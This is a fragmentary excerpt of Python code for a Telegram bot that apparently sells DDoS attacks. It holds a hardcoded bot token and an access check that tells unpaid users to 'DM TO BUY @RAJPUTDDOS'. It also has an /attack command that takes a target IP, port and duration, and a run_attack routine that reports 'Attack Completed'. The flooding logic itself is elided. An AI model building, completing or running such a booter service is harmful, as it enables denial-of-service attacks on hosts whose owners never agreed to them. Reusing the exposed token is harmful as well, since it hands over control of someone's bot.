...
TELEGRAM_BOT_TOKEN = '7594069837:AAEWP3Y-K9lOJMa5HzfWJsRXmfBAVZHY1Bg'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ DM TO BUY @RAJPUTDDOS ❌ ! /get_id*", parse_mode='Markdown')
        return
    message = (
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ DM TO BUY @RAJPUTDDOS ❌ !*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank For Using, https://t.me/RAJPUTDDOS1!*", parse_mode='Markdown')
